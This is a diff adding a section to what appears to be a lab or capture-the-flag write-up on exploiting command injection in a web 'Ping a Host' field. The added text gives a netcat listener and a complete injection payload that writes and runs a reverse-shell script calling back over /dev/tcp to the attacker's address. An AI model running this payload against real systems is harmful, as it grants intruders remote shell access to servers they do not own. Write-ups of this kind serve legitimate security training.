@@ -44,6 +44,17 @@ in this case, displaying the contents of secret file will need
 
 **opening reverse shell**
 
+since we have access to POSIX shell (but not exactly bash), we can setup a reverse shell by doing the following.
+
+1. On our machine, run
+
+    $ nc -l -p 8080 -vvv
+
+2. On "Ping a Host" input field, input
+
+    localhost && echo "exec 5<>/dev/tcp/10.12.72.6/8080; cat <&5 | while read line; do \$line 2>&5 >&5; done" > revshell.sh && chmod +x revshell.sh && bash revshell.sh
+
+  This will create a "revshell.sh" executable file that will redirect its shell to our open port, and then running it on bash. Remember to change "10.12.72.6" in the input to the appropriate ip. The website will hang, and our shell from step 1 will receive a connection. From then, we can access the target's bash by this shell.
 
 
 
